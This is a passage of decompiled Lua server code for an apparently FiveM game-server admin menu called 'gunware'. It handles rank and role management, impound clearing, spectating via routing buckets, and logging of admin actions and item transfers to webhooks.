  L9_2 = string
  L9_2 = L9_2.format
  L10_2 = "%s (ID: %d)"
  L11_2 = GetPlayerName
  L12_2 = A0_2
  L11_2 = L11_2(L12_2)
  L12_2 = A0_2
  L9_2 = L9_2(L10_2, L11_2, L12_2)
  L8_2.value = L9_2
  L8_2.inline = true
  L9_2 = {}
  L9_2.name = "\240\159\151\145\239\184\143 Rank supprim\195\169"
  L10_2 = string
  L10_2 = L10_2.format
  L11_2 = "%s (ID: %s)"
  L12_2 = L3_2
  L13_2 = A1_2
  L10_2 = L10_2(L11_2, L12_2, L13_2)
  L9_2.value = L10_2
  L9_2.inline = true
  L10_2 = {}
  L10_2.name = "\240\159\145\165 Membres affect\195\169s"
  L11_2 = string
  L11_2 = L11_2.format
  L12_2 = "%d joueur(s) perdront ce rank"
  L13_2 = L4_2
  L11_2 = L11_2(L12_2, L13_2)
  L10_2.value = L11_2
  L10_2.inline = false
  L11_2 = {}
  L11_2.name = "\240\159\149\144 Date/Heure"
  L12_2 = os
  L12_2 = L12_2.date
  L13_2 = "%d/%m/%Y %H:%M:%S"
  L12_2 = L12_2(L13_2)
  L11_2.value = L12_2
  L11_2.inline = false
  L7_2[1] = L8_2
  L7_2[2] = L9_2
  L7_2[3] = L10_2
  L7_2[4] = L11_2
  L6_2.fields = L7_2
  L5_2(L6_2)
end
function L86_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = L29_1
  L2_2 = A0_2
  L3_2 = "rank_manage"
  return L1_2(L2_2, L3_2)
end
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:sync:updateRank"
function L85_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2
  L3_2 = ranksExist
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = A0_2
    L6_2 = "error"
    L7_2 = "This rank does not exist."
    L3_2(L4_2, L5_2, L6_2, L7_2)
    return
  end
  L3_2 = L28_1
  L4_2 = A2_2.permissions
  if not L4_2 then
    L4_2 = {}
  end
  L3_2 = L3_2(L4_2)
  A2_2.permissions = L3_2
  L3_2 = A2_2.rankName
  if L3_2 then
    L3_2 = A2_2.rankName
    if L3_2 ~= A1_2 then
      L3_2 = ranksExist
      L4_2 = A2_2.rankName
      L3_2 = L3_2(L4_2)
      if L3_2 then
        L3_2 = TriggerClientEvent
        L4_2 = "gunware:notif"
        L5_2 = A0_2
        L6_2 = "error"
        L7_2 = "A rank with this name already exists."
        L3_2(L4_2, L5_2, L6_2, L7_2)
        return
      end
    end
  end
  L3_2 = A2_2.rankName
  if L3_2 then
    L3_2 = A2_2.rankName
    if L3_2 ~= A1_2 then
      L3_2 = ranksServer
      L4_2 = A2_2.rankName
      L5_2 = {}
      L6_2 = A2_2.rankName
      L5_2.label = L6_2
      L6_2 = A2_2.permissions
      L5_2.permissions = L6_2
      L6_2 = A2_2.rankColor
      L5_2.rankColor = L6_2
      L6_2 = A2_2.gamerTagColor
      if not L6_2 then
        L6_2 = 208
      end
      L5_2.gamerTagColor = L6_2
      L6_2 = ranksServer
      L6_2 = L6_2[A1_2]
      L6_2 = L6_2.players
      if not L6_2 then
        L6_2 = {}
      end
      L5_2.players = L6_2
      L3_2[L4_2] = L5_2
      L3_2 = ranksServer
      L3_2[A1_2] = nil
  end
  else
    L3_2 = ranksServer
    L3_2 = L3_2[A1_2]
    L4_2 = A2_2.rankName
    if not L4_2 then
      L4_2 = ranksServer
      L4_2 = L4_2[A1_2]
      L4_2 = L4_2.label
    end
    L3_2.label = L4_2
    L3_2 = ranksServer
    L3_2 = L3_2[A1_2]
    L4_2 = A2_2.permissions
    L3_2.permissions = L4_2
    L3_2 = ranksServer
    L3_2 = L3_2[A1_2]
    L4_2 = A2_2.rankColor
    L3_2.rankColor = L4_2
    L3_2 = ranksServer
    L3_2 = L3_2[A1_2]
    L4_2 = A2_2.gamerTagColor
    if not L4_2 then
      L4_2 = 208
    end
    L3_2.gamerTagColor = L4_2
  end
  L3_2 = saveRanks
  L3_2()
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:notif"
  L5_2 = A0_2
  L6_2 = "success"
  L7_2 = "Rank updated successfully."
  L3_2(L4_2, L5_2, L6_2, L7_2)
  L3_2 = logAdminAction
  L4_2 = {}
  L4_2.action = "Update Rank"
  L5_2 = GetPlayerName
  L6_2 = A0_2
  L5_2 = L5_2(L6_2)
  L4_2.playerName = L5_2
  L5_2 = "Updated rank: "
  L6_2 = A2_2.rankName
  if not L6_2 then
    L6_2 = A1_2
  end
  L5_2 = L5_2 .. L6_2
  L4_2.description = L5_2
  L4_2.webhook = "rank_management"
  L3_2(L4_2)
end
function L86_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = L29_1
  L2_2 = A0_2
  L3_2 = "rank_manage"
  return L1_2(L2_2, L3_2)
end
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:sync:role"
function L85_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L3_2 = A2_2.role
  if L3_2 then
    L3_2 = A2_2.target
    if L3_2 then
      goto lbl_14
    end
  end
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:notif"
  L5_2 = A0_2
  L6_2 = "error"
  L7_2 = "Missing parameters."
  L3_2(L4_2, L5_2, L6_2, L7_2)
  do return end
  ::lbl_14::
  L3_2 = GetPlayerName
  L4_2 = A2_2.target
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L3_2 = "Unknown Player"
  end
  if "add" == A1_2 then
    L4_2 = ranksExist
    L5_2 = A2_2.role
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      L4_2 = TriggerClientEvent
      L5_2 = "gunware:notif"
      L6_2 = A0_2
      L7_2 = "error"
      L8_2 = "This rank does not exist."
      L4_2(L5_2, L6_2, L7_2, L8_2)
      return
    end
    L4_2 = SetPlayerRole
    L5_2 = A2_2.role
    L6_2 = A2_2.target
    L4_2(L5_2, L6_2)
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "success"
    L8_2 = "Role added successfully."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A2_2.target
    L7_2 = "success"
    L8_2 = "You have received a new role: %s"
    L9_2 = L8_2
    L8_2 = L8_2.format
    L10_2 = A2_2.role
    L8_2, L9_2, L10_2 = L8_2(L9_2, L10_2)
    L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    L4_2 = logAdminAction
    L5_2 = {}
    L5_2.action = "Add Role"
    L6_2 = GetPlayerName
    L7_2 = A0_2
    L6_2 = L6_2(L7_2)
    L5_2.playerName = L6_2
    L6_2 = "Added role '"
    L7_2 = A2_2.role
    L8_2 = "' to "
    L9_2 = L3_2
    L6_2 = L6_2 .. L7_2 .. L8_2 .. L9_2
    L5_2.description = L6_2
    L5_2.webhook = "rank_management"
    L4_2(L5_2)
  elseif "remove" == A1_2 then
    L4_2 = RemovePlayerRole
    L5_2 = A2_2.role
    L6_2 = A2_2.target
    L4_2(L5_2, L6_2)
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A2_2.target
    L7_2 = "info"
    L8_2 = "Votre role '%s' a ete retire."
    L9_2 = L8_2
    L8_2 = L8_2.format
    L10_2 = A2_2.role
    L8_2, L9_2, L10_2 = L8_2(L9_2, L10_2)
    L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    L4_2 = logAdminAction
    L5_2 = {}
    L5_2.action = "Remove Role"
    L6_2 = GetPlayerName
    L7_2 = A0_2
    L6_2 = L6_2(L7_2)
    L5_2.playerName = L6_2
    L6_2 = "Removed role '"
    L7_2 = A2_2.role
    L8_2 = "' from "
    L9_2 = L3_2
    L6_2 = L6_2 .. L7_2 .. L8_2 .. L9_2
    L5_2.description = L6_2
    L5_2.webhook = "rank_management"
    L4_2(L5_2)
  end
end
function L86_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = L29_1
  L2_2 = A0_2
  L3_2 = "rank_manage"
  return L1_2(L2_2, L3_2)
end
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "removeCloneNoclip"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:removeCloneNoclipClient"
  L3_2 = -1
  L4_2 = A0_2
  L1_2(L2_2, L3_2, L4_2)
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:notif"
  L3_2 = A0_2
  L4_2 = "success"
  L5_2 = "Noclip clone removed for all players."
  L1_2(L2_2, L3_2, L4_2, L5_2)
  L1_2 = logAdminAction
  L2_2 = {}
  L2_2.action = "Remove Noclip Clone"
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L2_2.playerName = L3_2
  L2_2.description = "Removed noclip clone for all players"
  L2_2.webhook = "misc_admin"
  L1_2(L2_2)
end
L86_1 = "personal_noclip"
L83_1(L84_1, L85_1, L86_1)
L83_1 = RegisterNetEvent
L84_1 = "addweaponshoot"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "addweaponshoot"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = pairs
  L2_2 = PlayerServer
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = L6_2.role
    if L7_2 then
      L7_2 = L6_2.role
      if "user" ~= L7_2 then
        L7_2 = TriggerClientEvent
        L8_2 = "gunware:addweaponshootClient"
        L9_2 = L5_2
        L10_2 = A0_2
        L7_2(L8_2, L9_2, L10_2)
      end
    end
  end
end
L83_1(L84_1, L85_1)
L83_1 = L60_1
L84_1 = "gunware:deleteAllImpound"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = L31_1
  if L1_2 then
    L1_2 = L31_1.impoundAll
    if L1_2 then
      L1_2 = L31_1.impoundAll
      L1_2()
      L1_2 = TriggerClientEvent
      L2_2 = "gunware:notif"
      L3_2 = A0_2
      L4_2 = "success"
      L5_2 = "All impounded vehicles have been removed."
      L1_2(L2_2, L3_2, L4_2, L5_2)
      L1_2 = logAdminAction
      L2_2 = {}
      L2_2.action = "Delete All Impounded"
      L3_2 = GetPlayerName
      L4_2 = A0_2
      L3_2 = L3_2(L4_2)
      L2_2.playerName = L3_2
      L2_2.description = "Removed all vehicles from impound"
      L2_2.webhook = "vehicle_management"
      L1_2(L2_2)
  end
  else
    L1_2 = TriggerClientEvent
    L2_2 = "gunware:notif"
    L3_2 = A0_2
    L4_2 = "error"
    L5_2 = "Impound functionality not available."
    L1_2(L2_2, L3_2, L4_2, L5_2)
  end
end
L86_1 = "server_clear_impound"
L83_1(L84_1, L85_1, L86_1)
L83_1 = _ENV
L84_1 = "exports"
L83_1 = L83_1[L84_1]
L84_1 = "getPlayersData"
function L85_1(A0_2)
  local L1_2
  L1_2 = PlayerServer
  L1_2 = L1_2[A0_2]
  if not L1_2 then
    L1_2 = "Error : Player not found"
    return L1_2
  end
  L1_2 = PlayerServer
  L1_2 = L1_2[A0_2]
  return L1_2
end
L83_1(L84_1, L85_1)
L83_1 = _ENV
L84_1 = "RegisterServerCallback"
L83_1 = L83_1[L84_1]
L84_1 = "gunware:getOnlinePlayers"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L2_2 = {}
  L3_2 = pairs
  L4_2 = PlayerServer
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    if L7_2 ~= A0_2 then
      L9_2 = table
      L9_2 = L9_2.insert
      L10_2 = L2_2
      L11_2 = {}
      L12_2 = tonumber
      L13_2 = L7_2
      L12_2 = L12_2(L13_2)
      L11_2.id = L12_2
      L12_2 = L8_2.name
      L11_2.name = L12_2
      L12_2 = L8_2.rp
      L11_2.rp = L12_2
      L9_2(L10_2, L11_2)
    end
  end
  L3_2 = A1_2
  L4_2 = L2_2
  L3_2(L4_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:spectate:forceSync"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:spectate:forceSync"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = source
  L2_2 = L29_1
  L3_2 = L1_2
  L4_2 = "player_spectate"
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = IsMaster
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    if not L2_2 then
      return
    end
  end
  L2_2 = GetPlayerPed
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L2_2 = SetPlayerRoutingBucket
    L3_2 = A0_2
    L4_2 = 0
    L2_2(L3_2, L4_2)
  end
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:spectate:getMyRoutingBucket"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:spectate:getMyRoutingBucket"
function L85_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2
  L0_2 = source
  L1_2 = L29_1
  L2_2 = L0_2
  L3_2 = "player_spectate"
  L1_2 = L1_2(L2_2, L3_2)
  if not L1_2 then
    L1_2 = IsMaster
    L2_2 = L0_2
    L1_2 = L1_2(L2_2)
    if not L1_2 then
      return
    end
  end
  L1_2 = GetPlayerRoutingBucket
  L2_2 = L0_2
  L1_2 = L1_2(L2_2)
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:spectate:myRoutingBucket"
  L4_2 = L0_2
  L5_2 = L1_2
  L2_2(L3_2, L4_2, L5_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:spectate:getTargetRoutingBucket"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:spectate:getTargetRoutingBucket"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = source
  L2_2 = L29_1
  L3_2 = L1_2
  L4_2 = "player_spectate"
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = IsMaster
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    if not L2_2 then
      return
    end
  end
  L2_2 = GetPlayerPed
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = L1_2
    L5_2 = "error"
    L6_2 = "Joueur introuvable"
    L2_2(L3_2, L4_2, L5_2, L6_2)
    return
  end
  L2_2 = GetPlayerRoutingBucket
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:spectate:targetRoutingBucket"
  L5_2 = L1_2
  L6_2 = L2_2
  L3_2(L4_2, L5_2, L6_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:spectate:setRoutingBucket"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:spectate:setRoutingBucket"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = source
  L2_2 = L29_1
  L3_2 = L1_2
  L4_2 = "player_spectate"
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = IsMaster
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    if not L2_2 then
      return
    end
  end
  L2_2 = SetPlayerRoutingBucket
  L3_2 = L1_2
  L4_2 = A0_2 or L4_2
  if not A0_2 then
    L4_2 = 0
  end
  L2_2(L3_2, L4_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:spectate:getTargetCoords"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:spectate:getTargetCoords"
function L85_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = source
  L2_2 = L29_1
  L3_2 = L1_2
  L4_2 = "player_spectate"
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = IsMaster
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    if not L2_2 then
      return
    end
  end
  L2_2 = GetPlayerPed
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    return
  end
  L2_2 = GetEntityCoords
  L3_2 = GetPlayerPed
  L4_2 = A0_2
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  L2_2 = L2_2(L3_2, L4_2, L5_2, L6_2)
  L3_2 = TriggerClientEvent
  L4_2 = "gunware:spectate:targetCoords"
  L5_2 = L1_2
  L6_2 = L2_2
  L3_2(L4_2, L5_2, L6_2)
end
L83_1(L84_1, L85_1)
L83_1 = _ENV
L84_1 = "GetResourceState"
L83_1 = L83_1[L84_1]
L84_1 = "qb-core"
L83_1 = L83_1(L84_1)
L84_1 = "started"
if L83_1 == L84_1 then
  L83_1 = "Functions"
  L83_1 = L33_1[L83_1]
  L84_1 = "CreateCallback"
  L83_1 = L83_1[L84_1]
  L84_1 = "gunware:getOnlinePlayers"
  function L85_1(A0_2, A1_2)
    local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
    L2_2 = {}
    L3_2 = pairs
    L4_2 = PlayerServer
    L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
    for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
      if L7_2 ~= A0_2 then
        L9_2 = table
        L9_2 = L9_2.insert
        L10_2 = L2_2
        L11_2 = {}
        L12_2 = tonumber
        L13_2 = L7_2
        L12_2 = L12_2(L13_2)
        L11_2.id = L12_2
        L12_2 = L8_2.name
        L11_2.name = L12_2
        L12_2 = L8_2.rp
        L11_2.rp = L12_2
        L9_2(L10_2, L11_2)
      end
    end
    L3_2 = A1_2
    L4_2 = L2_2
    L3_2(L4_2)
  end
  L83_1(L84_1, L85_1)
end
L83_1 = _ENV
L84_1 = "CreateThread"
L83_1 = L83_1[L84_1]
function L84_1()
  local L0_2, L1_2, L2_2, L3_2
  L0_2 = GetResourceState
  L1_2 = "ox_inventory"
  L0_2 = L0_2(L1_2)
  if "started" ~= L0_2 then
    return
  end
  L0_2 = exports
  L0_2 = L0_2.ox_inventory
  L1_2 = L0_2
  L0_2 = L0_2.registerHook
  L2_2 = "swapItems"
  function L3_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3
    if A0_3 then
      L1_3 = A0_3.fromSlot
      if L1_3 then
        goto lbl_10
      end
    end
    L1_3 = print
    L2_3 = "[searchitems log] Aucun payload ou fromSlot invalide"
    L1_3(L2_3)
    do return end
    ::lbl_10::
    L1_3 = A0_3.fromType
    if "temp" == L1_3 then
      L1_3 = tostring
      L2_3 = A0_3.fromInventory
      L1_3 = L1_3(L2_3)
      L2_3 = L1_3
      L1_3 = L1_3.find
      L3_3 = "temp%-"
      L1_3 = L1_3(L2_3, L3_3)
      if L1_3 then
        L1_3 = A0_3.source
        if not L1_3 then
          L1_3 = 0
        end
        L2_3 = GetPlayerName
        L3_3 = L1_3
        L2_3 = L2_3(L3_3)
        if not L2_3 then
          L2_3 = "Inconnu"
        end
        L3_3 = A0_3.fromSlot
        L4_3 = logAdminAction
        L5_3 = {}
        L5_3.action = "Transfert d'item admin"
        L5_3.playerName = L2_3
        L6_3 = string
        L6_3 = L6_3.format
        L7_3 = "Transfert d'item admin: %s a pris **%d x %s** depuis un stash `/searchitems ou /allitems` vers son inventaire."
        L8_3 = L2_3
        L9_3 = A0_3.count
        if not L9_3 then
          L9_3 = 0
        end
        L10_3 = L3_3.name
        if not L10_3 then
          L10_3 = "inconnu"
        end
        L6_3 = L6_3(L7_3, L8_3, L9_3, L10_3)
        L5_3.description = L6_3
        L5_3.webhook = "item_transfer"
        L5_3.color = 2455275
        L4_3(L5_3)
      end
    end
  end
  L0_2(L1_2, L2_2, L3_2)
end
L83_1(L84_1)
